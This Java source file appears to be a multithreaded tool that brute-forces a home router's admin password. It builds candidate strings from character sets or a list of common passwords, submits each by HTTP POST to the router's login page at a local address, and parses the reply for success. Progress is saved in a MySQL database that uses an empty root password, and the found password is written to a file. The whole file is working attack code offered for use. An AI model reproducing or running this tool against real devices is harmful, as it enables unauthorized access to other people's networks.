package edu.auburn.bzl0048.metrobaidu.password;

import edu.auburn.bzl0048.metrobaidu.PasswordApplication;
import edu.auburn.bzl0048.metrobaidu.dao.PasswordDao;
import edu.auburn.bzl0048.metrobaidu.vo.passwordVO.PasswordVO;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import javax.sql.DataSource;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Slf4j
public class BzlPassword implements Runnable {

    private int initCounter;
    private int maxLength;
    private int waitingSeconds;
    private int maxCounter;
    private String threadName;

    public BzlPassword(String threadName, int initCounter,int maxCounter, int maxLength, int waittingSeconds) {
        this.threadName = threadName;
        this.initCounter = initCounter;
        this.maxLength = maxLength;
        this.waitingSeconds = waittingSeconds;
        this.maxCounter = maxCounter;
    }

    @Override
    public void run() {
        try {
            Thread threadShutDown = new Thread(() -> {
                PasswordApplication.passwordVOList.forEach(passwordVO -> {
                    if (passwordVO.getThreadName().equals(threadName)) {
                        log.info("Stoping " + passwordVO.getThreadName() + " at counter " + passwordVO.getCounter());
                        PasswordDao passwordDao = new PasswordDao(new JdbcTemplate(getDataSource()));
                        passwordDao.update(passwordVO);
                    }
                });
                if (PasswordApplication.resultPasswordVO != null && PasswordApplication.resultPwd != null) {
                    log.info("Thread " + PasswordApplication.resultPasswordVO.getThreadName()
                            + " found the password at counter" + PasswordApplication.resultPasswordVO.getCounter()
                            + ", and the password is " + PasswordApplication.resultPwd);
                }
            });

            Runtime.getRuntime().addShutdownHook(threadShutDown);

            start(initCounter, maxLength, waitingSeconds, maxCounter);

        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }


    private void start(int initCounter, int maxLength, int waittingSeconds, int maxCounter) throws InterruptedException {
        int currentCounter = dictionary(initCounter, maxLength);
        if (currentCounter >= 0) {
            log.info("Exception caught at counter "+ currentCounter +", sleeping for " +waittingSeconds+ " seconds");
            TimeUnit.SECONDS.sleep(waittingSeconds);
            start(currentCounter, maxLength, waittingSeconds, maxCounter);
        } else if (currentCounter == -2) {
            log.info("Successfully found the password, go to pwd.txt to find out!");
            log.info("Stopping program...");
            System.exit(0);
        } else if (currentCounter == -3) {
            log.info("Stopped at max counter " + currentCounter);
        } else if (currentCounter == -1) {
            log.info("Finished but not found the password");
        } else {
            log.info("Stopped at counter " + currentCounter);
        }
    }

    private int dictionary(int initCounter, int maxLength) {
        int counter = initCounter;
        try {
//            PasswordDao passwordDao = new PasswordDao(new JdbcTemplate(getDataSource()));
//            PasswordVO passwordVO = new PasswordVO();
            PasswordVO passwordVO = new PasswordVO();
            for (PasswordVO passwordVO1 :
                    PasswordApplication.passwordVOList) {
                if (threadName.equals(passwordVO1.getThreadName())) {
                    passwordVO = passwordVO1;
                }
            }

//            PasswordApplication.passwordVOList.forEach(passwordVO1 -> {
//                if (threadName.equals(passwordVO1.getThreadName())) {
//                    passwordVO.setThreadName(passwordVO1.getThreadName());
//                    passwordVO.setCounter(passwordVO1.getCounter());
//                }
//            });
//            passwordVO.setThreadName(threadName);
            //密码可能会包含的字符集合
//            char[] fullCharSource = { '1','2','3','4','5','6','7','8','9','0',
//                    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',  'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
//                    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',  'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
//                    '~', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '{', '}', '|', ':', '"', '<', '>', '?', ';', '\'', ',', '.', '/', '-', '=', '`'};
//            char[] fullCharSource = { '1','2','3','4','5','6','7','8','9','0',
//                    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',  'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
//                    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',  'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'};

//            char[] fullCharSource = { '1','2','3','4','5','6','7','8','9','0',
//                    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',  'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

//            String[] fullStringSource = {
//                    "123456", "12345678", "123", "pass", "password", "123456789", "12345", "111111", "sunshine", "qwerty", "asdfg", "iloveyou", "danke", "life",
//                    "wifi", ".", "princess", "admin", "root", "welcome", "666666", "66666666", "abc123",
//                    "football", "123123", "monkey", "654321", "!@#$%^&*", "charlie", "aa123456", "donald",
//                    "password1", "qwerty123", "starwars", "hello", "hi", "Password", "Danke", "Life", "Wifi", "DANKE", "LIFE", "WIFI", "LOGIN", "login", "ADMIN",
//                    "ROOT", "ABC"};

            String[] fullStringSource = {
                    "0440", "-", "A92E", "B4BF"};


//            int maxLength = 5;
//            int fullCharLength = fullCharSource.length;
            int fullCharLength = fullStringSource.length;
            StringBuilder stringBuilder = new StringBuilder();
            PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream("/opt/pwd.txt"), "utf-8"));
            int stringLength = 0;
            while(stringBuilder.toString().length() <= maxLength) {
                if (stringLength != stringBuilder.toString().length()) {
                    stringLength = stringBuilder.toString().length();
                    log.info("Current string length = " + stringLength);
                }

                stringBuilder = new StringBuilder(maxLength * 2);
                int _counter = counter;
                while (_counter >= fullCharLength) {
//                    stringBuilder.insert(0, fullCharSource[_counter % fullCharLength]);
                    stringBuilder.insert(0, fullStringSource[_counter % fullCharLength]);
                    _counter = _counter / fullCharLength;
                    //处理进制体系中只有10没有01的问题，在穷举里面是可以存在01的
                    _counter--;
                }
//                stringBuilder.insert(0,fullCharSource[_counter]);
                stringBuilder.insert(0, fullStringSource[_counter]);
                counter++;
                passwordVO.setCounter(counter);
//                passwordDao.update(passwordVO);

//            pw.write(stringBuilder.toString()+"\n");
//            System.out.println(stringBuilder.toString());
//            TimeUnit.SECONDS.sleep(1);
//                TimeUnit.MILLISECONDS.sleep(100);
                if (getResult(stringBuilder.toString())) {
                    pw.write(stringBuilder.toString());
                    PasswordApplication.resultPasswordVO = new PasswordVO();
                    PasswordApplication.resultPasswordVO.setThreadName(threadName);
                    PasswordApplication.resultPasswordVO.setCounter(counter);
                    PasswordApplication.resultPwd = stringBuilder.toString();
                    log.info("true password = " + stringBuilder.toString() + " counter = " + counter + " _counter = " + _counter);
                    return -2;
                } else {
                    log.info("Thread = " + threadName + " false password = " + stringBuilder.toString() + " counter = " + counter + " _counter = " + _counter);
                }
                if (counter == maxCounter) {
                    return -3;
                }
            }
        } catch (Exception e) {
            return counter;
        }
        return -1;
    }

    private boolean getResult(String pwd) {

        String apiAddress = "http://192.168.124.1/router_password_mobile.asp";
        RestTemplate restTemplate = new RestTemplate();
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        MultiValueMap<String, String> map= new LinkedMultiValueMap<>();
        map.add("psd", pwd);
        HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(map, headers);

        ResponseEntity<String> response = restTemplate.postForEntity( apiAddress, request , String.class );
        String responseBody = response.getBody();
        boolean result = praseHtml(responseBody);
//        log.info( map + " "+ result);
        return result;
    }


    private boolean praseHtml(String htmlBody) {
        // var resultInfo="false;0";
        String patternString = "var resultInfo=\"(false|true|null);";
        Pattern pattern = Pattern.compile(patternString);
        Matcher m = pattern.matcher(htmlBody);
        String matchedString = "";
        while (m.find()) {
            matchedString = m.group(0);
        }
        String[] resultArr = matchedString.replaceAll("var resultInfo=\"", "").split(";");
        String result = resultArr[0];
        if (result.equals("true")) {
            return true;
        } else {
            return false;
        }
    }

    private DriverManagerDataSource getDataSource() {
        DriverManagerDataSource driverManagerDataSource = new DriverManagerDataSource();
        driverManagerDataSource.setDriverClassName("com.mysql.jdbc.Driver");
        driverManagerDataSource.setUrl("jdbc:mysql://localhost/password");
        driverManagerDataSource.setUsername("root");
        driverManagerDataSource.setPassword("");
        return driverManagerDataSource;
    }


//    // 207485   207683   272096
//    public static void main(String[] args) {
//
//        int gapSteps = 1000000;
//
//        DriverManagerDataSource driverManagerDataSource = new DriverManagerDataSource();
//        driverManagerDataSource.setDriverClassName("com.mysql.jdbc.Driver");
//        driverManagerDataSource.setUrl("jdbc:mysql://localhost/password");
//        driverManagerDataSource.setUsername("root");
//        driverManagerDataSource.setPassword("");
//
//        DataSource dataSource = driverManagerDataSource;
//        JdbcTemplate jdbcTemplate = new JdbcTemplate(dataSource);
//        PasswordDao passwordDao = new PasswordDao(jdbcTemplate);
//        List<PasswordVO> passwordVOList = passwordDao.getAll();
//        passwordVOList.forEach(passwordVO -> {
//            Runnable runnable = new BzlPassword(
//                    passwordVO.getThreadName(),
//                    passwordVO.getCounter(),
//                    passwordVO.getMaxCounter(),
//                    20,
//                    5);
//            Thread thread = new Thread(runnable);
//            thread.start();
//        });
//
////        Runnable runnable1 = new BzlPassword("First thread", 228800, 1000000000,20, 5);
////        Thread thread1 = new Thread(runnable1);
//
//
////        Runnable runnable2 = new BzlPassword("Second thread", 1001284, 1999999,20, 5);
////        Thread thread2 = new Thread(runnable2);
//
//
//
////        thread1.start();
////        thread2.start();
//
//
//    }
}
